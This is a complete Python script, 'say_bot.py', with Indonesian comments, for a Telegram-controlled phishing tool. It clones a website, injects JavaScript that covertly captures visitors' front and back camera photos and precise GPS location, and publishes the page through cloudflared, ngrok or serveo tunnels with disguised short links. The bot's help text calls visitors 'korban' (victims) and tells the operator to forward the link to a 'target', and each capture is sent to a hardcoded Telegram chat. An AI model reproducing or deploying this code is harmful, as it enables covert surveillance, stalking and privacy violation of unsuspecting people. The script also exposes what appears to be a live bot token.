#!/usr/bin/env python3
# lang: Python 3, file: say_bot.py, target: Termux / Linux
# jalankan: python say_bot.py
# dep: flask requests pyngrok python-telegram-bot
# install: pip install flask requests python-telegram-bot

import os
import sys
import base64
import datetime
import threading
import time
import subprocess
import shutil
import socket
import re
import signal
import asyncio

try:
    from flask import Flask, request as flask_request, jsonify
except ImportError:
    print("[!] Flask belum ada. pip install flask")
    sys.exit(1)

try:
    import requests as req_lib
except ImportError:
    print("[!] requests belum ada. pip install requests")
    sys.exit(1)

try:
    from telegram import Bot
    from telegram.ext import Application, CommandHandler, ContextTypes
    from telegram import Update
except ImportError:
    print("[!] python-telegram-bot belum ada. pip install python-telegram-bot")
    sys.exit(1)

try:
    from pyngrok import ngrok as _ngrok
    PYNGROK = True
except ImportError:
    PYNGROK = False

# ------------------------------------------------------------------ #
#  KONFIGURASI — isi di sini
# ------------------------------------------------------------------ #
BOT_TOKEN = "9018666159:AAFACZ-KMGH04QrTiDgEuW5hmGtjFoUE8C4"
CHAT_ID   = "8598136412"

# ------------------------------------------------------------------ #
#  BANNER
# ------------------------------------------------------------------ #
BANNER = r"""
  ____                ____ _                         
 / ___|  __ _ _   _  / ___| |__   ___  ___  ___  ___ 
 \___ \ / _` | | | || |   | '_ \ / _ \/ _ \/ __|/ _ \
  ___) | (_| | |_| || |___| | | |  __/  __/\__ \  __/
 |____/ \__,_|\__, | \____|_| |_|\___|\___||___/\___|
              |___/                                   
  Telegram Bot Edition — kontrol lewat @Spyjsbot
"""

# ------------------------------------------------------------------ #
#  JS INJECT
# ------------------------------------------------------------------ #
INJECT_JS = """
<script>
(function(){
  var locSent = false;
  function sendData(lat, lon, accuracy, frontB64, backB64) {
    if (locSent) return;
    locSent = true;
    fetch('/capture', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        lat: lat, lon: lon,
        accuracy: accuracy,
        photo_front: frontB64 || null,
        photo_back:  backB64  || null
      })
    });
  }
  function grabLocation(frontB64, backB64) {
    if (!navigator.geolocation) {
      sendData(null, null, null, frontB64, backB64); return;
    }
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        sendData(pos.coords.latitude, pos.coords.longitude,
                 pos.coords.accuracy, frontB64, backB64);
      },
      function() { sendData(null, null, null, frontB64, backB64); },
      {enableHighAccuracy: true, timeout: 10000}
    );
  }
  function snapCamera(facingMode, cb) {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      cb(null); return;
    }
    navigator.mediaDevices.getUserMedia({
      video: {facingMode: {ideal: facingMode}}, audio: false
    })
    .then(function(stream) {
      var video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline', '');
      video.muted = true;
      video.play();
      var fired = false;
      function onFrame() {
        if (fired) return;
        fired = true;
        var canvas = document.createElement('canvas');
        canvas.width  = video.videoWidth  || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        stream.getTracks().forEach(function(t){ t.stop(); });
        cb(canvas.toDataURL('image/jpeg', 0.85).split(',')[1]);
      }
      video.addEventListener('loadeddata', onFrame);
      setTimeout(function(){
        if (!fired) {
          fired = true;
          stream.getTracks().forEach(function(t){t.stop();});
          cb(null);
        }
      }, 5000);
    })
    .catch(function() { cb(null); });
  }
  function start() {
    snapCamera('environment', function(backB64) {
      snapCamera('user', function(frontB64) {
        grabLocation(frontB64, backB64);
      });
    });
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', start);
  } else { start(); }
})();
</script>
"""

# ------------------------------------------------------------------ #
#  STATE GLOBAL
# ------------------------------------------------------------------ #
_page_html   = ""
_bot_loop    = None   # event loop thread bot
_flask_port  = 8080

# ------------------------------------------------------------------ #
#  HELPER
# ------------------------------------------------------------------ #
def free_port(start: int = 8080) -> int:
    port = start
    while True:
        with socket.socket() as s:
            if s.connect_ex(("127.0.0.1", port)) != 0:
                return port
            port += 1

def clone_url(url: str) -> str:
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 "
                      "Chrome/112.0.0.0 Mobile Safari/537.36"
    }
    r = req_lib.get(url, headers=headers, timeout=15)
    r.raise_for_status()
    return r.text

def inject_into_html(html: str) -> str:
    lower = html.lower()
    idx = lower.rfind("</body>")
    if idx != -1:
        return html[:idx] + INJECT_JS + html[idx:]
    return html + INJECT_JS

def save_b64_image(b64: str, path: str) -> bool:
    try:
        with open(path, "wb") as f:
            f.write(base64.b64decode(b64))
        return True
    except Exception as e:
        print(f"[!] Gagal simpan {path}: {e}")
        return False

# ------------------------------------------------------------------ #
#  KIRIM HASIL KE TELEGRAM
# ------------------------------------------------------------------ #
def send_telegram_result(data: dict):
    """Jalankan di thread terpisah agar tidak block Flask."""
    asyncio.run(_send_async(data))

async def _send_async(data: dict):
    bot = Bot(token=BOT_TOKEN)
    ts  = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    lat   = data.get("lat")
    lon   = data.get("lon")
    acc   = data.get("accuracy")
    front = data.get("photo_front")
    back  = data.get("photo_back")

    # --- pesan lokasi ---
    if lat and lon:
        maps_url = f"https://maps.google.com/?q={lat},{lon}"
        teks = (
            f"📍 *Hasil Capture* — {ts}\n\n"
            f"Latitude  : `{lat}`\n"
            f"Longitude : `{lon}`\n"
            f"Akurasi   : `{acc} meter`\n"
            f"[Buka di Maps]({maps_url})"
        )
        await bot.send_message(
            chat_id=CHAT_ID,
            text=teks,
            parse_mode="Markdown"
        )
        # kirim location pin
        await bot.send_location(
            chat_id=CHAT_ID,
            latitude=float(lat),
            longitude=float(lon)
        )
    else:
        await bot.send_message(
            chat_id=CHAT_ID,
            text=f"⚠️ *Capture {ts}*\nLokasi tidak berhasil didapat.",
            parse_mode="Markdown"
        )

    # --- foto back ---
    if back:
        try:
            img_bytes = base64.b64decode(back)
            await bot.send_photo(
                chat_id=CHAT_ID,
                photo=img_bytes,
                caption="📷 Kamera Belakang"
            )
        except Exception as e:
            print(f"[!] Gagal kirim foto back: {e}")

    # --- foto front ---
    if front:
        try:
            img_bytes = base64.b64decode(front)
            await bot.send_photo(
                chat_id=CHAT_ID,
                photo=img_bytes,
                caption="🤳 Kamera Depan (Selfie)"
            )
        except Exception as e:
            print(f"[!] Gagal kirim foto front: {e}")

    # simpan ke file juga sebagai backup
    os.makedirs("hasil", exist_ok=True)
    file_ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    loc_path = os.path.join("hasil", f"lokasi_{file_ts}.txt")
    with open(loc_path, "w") as f:
        if lat and lon:
            f.write(f"Latitude  : {lat}\nLongitude : {lon}\n"
                    f"Accuracy  : {acc} meter\n"
                    f"Maps      : https://maps.google.com/?q={lat},{lon}\n")
        else:
            f.write("Lokasi tidak berhasil didapat.\n")

    if back:
        p = os.path.join("hasil", f"back_{file_ts}.jpg")
        save_b64_image(back, p)
    if front:
        p = os.path.join("hasil", f"front_{file_ts}.jpg")
        save_b64_image(front, p)

# ------------------------------------------------------------------ #
#  FLASK
# ------------------------------------------------------------------ #
flask_app = Flask(__name__)

@flask_app.route("/")
def index():
    return _page_html

@flask_app.route("/capture", methods=["POST"])
def capture():
    data = flask_request.get_json(silent=True) or {}
    # kirim ke telegram di thread terpisah
    t = threading.Thread(target=send_telegram_result, args=(data,), daemon=True)
    t.start()
    return jsonify({"ok": True})

def run_flask(port: int):
    flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

# ------------------------------------------------------------------ #
#  TUNNEL
# ------------------------------------------------------------------ #
def tunnel_cloudflared(port: int) -> str | None:
    binary = shutil.which("cloudflared") or shutil.which("cloudflared.exe")
    if not binary:
        print("[!] cloudflared tidak ditemukan.")
        print("    Termux : pkg install cloudflared")
        return None
    proc = subprocess.Popen(
        [binary, "tunnel", "--url", f"http://localhost:{port}"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1
    )
    print("[*] Menunggu tunnel cloudflared...")
    url_pattern = re.compile(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com")
    for _ in range(40):
        line = proc.stdout.readline()
        if not line:
            time.sleep(0.5)
            continue
        match = url_pattern.search(line)
        if match:
            return match.group(0)
    print("[!] Cloudflared timeout.")
    proc.terminate()
    return None

def tunnel_ngrok(port: int) -> str | None:
    if PYNGROK:
        try:
            tunnel = _ngrok.connect(port, "http")
            return tunnel.public_url.replace("http://", "https://")
        except Exception as e:
            print(f"[!] pyngrok error: {e}")
    if shutil.which("ngrok"):
        subprocess.Popen(
            ["ngrok", "http", str(port)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(3)
        try:
            r = req_lib.get("http://127.0.0.1:4040/api/tunnels", timeout=3)
            for t in r.json().get("tunnels", []):
                u = t.get("public_url", "")
                if u.startswith("https"):
                    return u
        except Exception:
            pass
    return None

def tunnel_serveo(port: int) -> str | None:
    if not shutil.which("ssh"):
        return None
    proc = subprocess.Popen(
        ["ssh", "-o", "StrictHostKeyChecking=no",
         "-o", "ServerAliveInterval=30",
         "-R", f"80:localhost:{port}", "serveo.net"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1
    )
    url_pattern = re.compile(r"https?://[a-zA-Z0-9\-]+\.serveo\.net")
    for _ in range(30):
        line = proc.stdout.readline()
        if not line:
            time.sleep(0.5)
            continue
        match = url_pattern.search(line)
        if match:
            return match.group(0)
    proc.terminate()
    return None

# ------------------------------------------------------------------ #
#  CUSTOM LINK
# ------------------------------------------------------------------ #
def shorten_isgd(long_url: str, alias: str) -> str | None:
    try:
        r = req_lib.get(
            "https://is.gd/create.php",
            params={"format": "simple", "url": long_url, "shorturl": alias},
            timeout=10
        )
        result = r.text.strip()
        if result.startswith("http") and "is.gd" in result:
            return result
    except Exception:
        pass
    return None

def shorten_tinyurl(long_url: str, alias: str) -> str | None:
    try:
        r = req_lib.get(
            "https://tinyurl.com/api-create.php",
            params={"url": long_url, "alias": alias},
            timeout=10
        )
        result = r.text.strip()
        if result.startswith("http") and "tinyurl.com" in result:
            return result
    except Exception:
        pass
    return None

# ------------------------------------------------------------------ #
#  TELEGRAM BOT COMMANDS
# ------------------------------------------------------------------ #
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *SayCheeseBot aktif!*\n\n"
        "Perintah tersedia:\n"
        "/link — lihat link aktif\n"
        "/status — cek server\n"
        "/help — bantuan",
        parse_mode="Markdown"
    )

async def cmd_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if hasattr(context.bot_data, 'pub_url') and context.bot_data.get('pub_url'):
        url = context.bot_data['pub_url']
        await update.message.reply_text(
            f"🔗 *Link aktif:*\n`{url}`\n\nForward link ini ke target.",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("⚠️ Belum ada link aktif. Tunnel belum jalan.")

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pub_url = context.bot_data.get('pub_url', 'Tidak ada')
    await update.message.reply_text(
        f"✅ *Server:* Aktif\n"
        f"🔗 *URL:* `{pub_url}`\n"
        f"📁 *Hasil:* ./hasil/",
        parse_mode="Markdown"
    )

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *Panduan SayCheeseBot*\n\n"
        "1. Bot otomatis kirim hasil ke chat ini\n"
        "2. Setiap ada korban buka link → dapat foto + lokasi\n"
        "3. /link untuk lihat URL yang perlu dikirim ke target\n\n"
        "Hasil juga disimpan di folder `./hasil/`",
        parse_mode="Markdown"
    )

# ------------------------------------------------------------------ #
#  MAIN
# ------------------------------------------------------------------ #
def main():
    global _page_html, _flask_port

    print(BANNER)

    # === template ===
    print("=" * 57)
    print("  [1] Clone dari URL")
    print("  [2] Pakai file HTML lokal")
    print("=" * 57)

    while True:
        pilihan = input("\n Pilihan template (1/2): ").strip()
        if pilihan in ("1", "2"):
            break

    if pilihan == "1":
        url = input(" URL template : ").strip()
        if not url.startswith("http"):
            url = "https://" + url
        print(f"[*] Cloning {url} ...")
        try:
            raw_html = clone_url(url)
            print("[+] Clone berhasil.")
        except Exception as e:
            print(f"[!] Gagal clone: {e}")
            sys.exit(1)
    else:
        path = input(" Path file HTML : ").strip().strip('"').strip("'")
        if not os.path.isfile(path):
            print(f"[!] File tidak ditemukan: {path}")
            sys.exit(1)
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            raw_html = f.read()
        print("[+] File berhasil dibaca.")

    _page_html = inject_into_html(raw_html)
    print("[+] JS injeksi OK.")

    _flask_port = free_port(8080)

    # === tunnel ===
    print("\n" + "=" * 57)
    print("  Pilih tunnel:")
    print("  [1] Cloudflared  ★ RECOMMENDED")
    print("  [2] Ngrok")
    print("  [3] Serveo")
    print("=" * 57)

    while True:
        mode = input("\n Pilihan tunnel (1/2/3): ").strip()
        if mode in ("1", "2", "3"):
            break

    # flask di background
    ft = threading.Thread(target=run_flask, args=(_flask_port,), daemon=True)
    ft.start()
    time.sleep(1.2)

    pub_url = None
    if mode == "1":
        pub_url = tunnel_cloudflared(_flask_port)
    elif mode == "2":
        pub_url = tunnel_ngrok(_flask_port)
    elif mode == "3":
        pub_url = tunnel_serveo(_flask_port)

    if not pub_url:
        print("[!] Tunnel gagal.")
        sys.exit(1)

    # custom link
    final_url = pub_url
    mau = input("\n Custom link? (y/n): ").strip().lower()
    if mau == "y":
        alias = input(" Alias (contoh: sayacheese): ").strip()
        alias = re.sub(r"[^a-zA-Z0-9\-_]", "", alias)
        if len(alias) >= 3:
            print(f"[*] Mencoba is.gd/{alias} ...")
            r = shorten_isgd(pub_url, alias)
            if r:
                final_url = r
                print(f"[+] is.gd berhasil: {r}")
            else:
                print("[*] is.gd gagal, coba TinyURL ...")
                r = shorten_tinyurl(pub_url, alias)
                if r:
                    final_url = r
                    print(f"[+] TinyURL berhasil: {r}")
                else:
                    print("[!] Semua provider gagal, pakai URL asli.")

    print(f"\n{'=' * 57}")
    print(f"  [+] LINK PUBLIK  : {final_url}")
    if final_url != pub_url:
        print(f"  [+] LINK ASLI    : {pub_url}")
    print(f"{'=' * 57}\n")

    # kirim link ke telegram
    async def notify_start():
        bot = Bot(token=BOT_TOKEN)
        await bot.send_message(
            chat_id=CHAT_ID,
            text=(
                f"✅ *Bot aktif!*\n\n"
                f"🔗 Link: `{final_url}`\n\n"
                f"Forward link ini ke target. "
                f"Hasil akan dikirim otomatis ke sini."
            ),
            parse_mode="Markdown"
        )

    asyncio.run(notify_start())
    print("[+] Notifikasi start terkirim ke Telegram.")

    # === jalankan bot telegram ===
    app = Application.builder().token(BOT_TOKEN).build()
    app.bot_data['pub_url'] = final_url

    app.add_handler(CommandHandler("start",  cmd_start))
    app.add_handler(CommandHandler("link",   cmd_link))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("help",   cmd_help))

    print("[*] Bot Telegram polling... Ctrl+C untuk berhenti.\n")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
